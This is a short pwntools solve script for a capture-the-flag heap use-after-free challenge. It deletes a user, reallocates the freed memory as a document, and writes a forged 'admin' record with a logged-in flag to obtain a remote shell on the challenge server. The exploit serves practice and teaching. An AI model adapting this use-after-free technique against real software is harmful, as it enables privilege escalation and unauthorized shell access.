# Heap-0-Baby-UaF — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 1360

#context.log_level = "debug"
io = remote(HOST, PORT)

io.sendlineafter(b"> ",b"help")
io.sendlineafter(b"> ",b"info")
io.sendlineafter(b"> ",b"create_user ir0nx")
io.sendlineafter(b"> ",b"del_user 2")
io.sendlineafter(b"> ",b"create_doc")

name = b"admin"
logged_in = p32(1)
payload = name + (60-len(name))*b"\0" + logged_in
log.success(f"{len(payload) = }")
io.sendlineafter(b"> ",b"write_doc 0 " + payload)
io.sendlineafter(b"> ",b"switch_user 2")
io.sendlineafter(b">", b"shell")

io.interactive()
